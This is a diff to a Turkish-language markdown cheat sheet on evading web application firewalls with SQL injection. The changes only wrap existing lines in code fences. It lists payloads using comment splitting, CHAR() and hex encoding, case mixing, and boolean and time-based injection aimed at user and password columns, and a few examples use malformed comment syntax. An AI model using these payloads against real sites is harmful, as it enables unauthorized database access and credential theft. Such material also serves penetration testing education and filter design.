@@ -284,39 +284,52 @@ Web uygulamalarındaki WAF (Web Application Firewall) veya filtreleri aşmak iç
 
 ### 1️⃣ HTML / SQL Keyword Parçalama
 - WAF bazı kelimeleri filtreler, araya yorum satırı veya boşluk ekleyerek bypass yapılabilir.
+ ```
 UN//ION//SELECT
 SEL/**/ECT username, password
+```
 
 
 ### 2️⃣ ASCII / Char Kodlama
 - Karakterleri ASCII veya CHAR() fonksiyonu ile ifade etmek.
+ ```
 SELECT CHAR(117,115,101,114) FROM users
 SELECT user() FROM dual WHERE id=CHAR(97,100,109,105,110)
+ ```
 
 ### 3️⃣ URL / Hex Encode
 - URL encode veya hex encode ile WAF’ı atlatmak.
+ ```
 %27 OR %271%27=%271
 0x61646D696E -- admin
+ ```
 
 ### 4️⃣ Case Manipülasyonu
 - Büyük/küçük harf değişimi ile filtreyi bypass etmek.
+ ```
 SeLeCt username FROM users
 UnIoN sElEcT null,null--
+ ```
 
 ### 5️⃣ Yorum Satırı ile Bölme
 - SQL keyword’lerini bölerek bypass.
+ ```
 UNION/comment/SELECT
 SEL/x/ECT password FROM users
+ ```
 
 ### 6️⃣ Karakter Obfuscation / Fonksiyon Kullanımı
+ ```
 CONCAT(CHAR(97,100,109,105,110),CHAR(58),password)
-
+ ```
 
 ### 7️⃣ Boolean / Time-Based Bypass
 - Basit TRUE/FALSE mantığı veya gecikme fonksiyonu kullanarak WAF’ı atlatmak.
+ ```
 1' AND 1=1-- -- normal
 1' AND 1=1/**/-- -- yorum satırı eklenmiş
 1' OR IF(1=1, SLEEP(5), 0)-- -- time-based
+ ```
 
 ### 📌 Özet Notlar
 - **WAF filtreleri** genellikle SQL keywordlerini, özel karakterleri veya tekrarlayan pattern’leri engeller.
